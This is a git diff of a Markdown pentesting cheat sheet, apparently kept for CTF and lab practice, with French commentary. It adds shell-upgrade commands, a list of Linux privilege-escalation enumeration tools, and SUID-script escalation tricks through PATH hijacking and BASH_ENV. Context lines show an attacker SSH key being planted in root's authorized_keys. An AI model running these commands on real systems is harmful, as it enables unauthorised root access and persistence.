@@ -45,11 +45,10 @@ curl 'http://remote@ip' -X POST -d 'url=http%3A%2F%2FLOCAL-ADDRESS%3ALOCAL-PORT%
 ufw allow from adresseip proto tcp to any port 80,443
 ```
 
-## *linux update shell*
+# foothold enum
+## *update shell*
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-```
-```
 script /dev/null -c bash
 ^Z
 stty raw -echo; fg
@@ -57,9 +56,33 @@ reset
 screen
 ```
 
+```
+python -c 'import pty;pty.spawn("/bin/bash");'  
+ctrl z  
+echo $TERM  
+stty -a  
+stty raw -echo  
+fg  
 
-# foothold enum
-## _lse_
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH  
+export TERM=xterm256-color  
+export SHELL=bash  
+
+stty rows \<> colums \<>  
+```
+
+## Automated script
+```
+linPEAS.sh
+LinEnum.sh
+linuxprivchecker.py
+unix-privesc-check
+Mestaploit: multi/recon/local_exploit_suggester
+
+```
+### GTFONow
+https://github.com/Frissi0n/GTFONow
+### lse
 https://github.com/diego-treitos/linux-smart-enumeration
 ## _distrib info_
 ```
@@ -109,7 +132,9 @@ bash -p
 	| `ssh-keygen -f key` | Create a new SSH key |
 	| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | Add the generated public key to the user |
 	| `ssh root@10.10.10.10 -i key` | SSH to the server with the generated private key |
-# Exploit absolute path
+
+## SUID script
+### Exploit absolute path
 ```
 % cat change-pass 
 #!/bin/ksh user=$1 
@@ -127,6 +152,24 @@ The PATH has been changed, and the change-pass command now runs the /tmp/passwd 
 $ export PATH=/hack/path:$PATH
 $ echo $PATH
 ```
+
+###  script content : system("/bin/bash");
+```
+mkdir /tmp/mych13  
+echo "cat .passwd" > /tmp/mych13/startup.sh  
+export BASH_ENV=/tmp/mych13/startup.sh  
+./script
+```
+`BASH_ENV` est une variable d'environnement utilisée dans le shell Bash sur les systèmes Linux. Elle spécifie le chemin d'accès vers un fichier qui sera exécuté avant le démarrage de chaque session Bash non interactive.
+
+Une session Bash non interactive est généralement celle qui est utilisée pour exécuter des scripts plutôt que pour une interaction directe avec l'utilisateur dans un terminal. Lorsque vous exécutez un script Bash, la variable `BASH_ENV` peut être utilisée pour spécifier un fichier contenant des configurations spécifiques qui doivent être chargées avant l'exécution du script.
+
+Par exemple, si vous avez un fichier de configuration spécifique pour vos scripts Bash, comme des variables d'environnement particulières ou des paramètres spécifiques au script, vous pouvez le spécifier en utilisant la variable `BASH_ENV`. Cela permet d'assurer que ces configurations sont en place avant l'exécution du script.
+
+```
+cat /tmp/toto - |./script
+```
+
 # Transferring Files
 Start a local webserver 
 ```
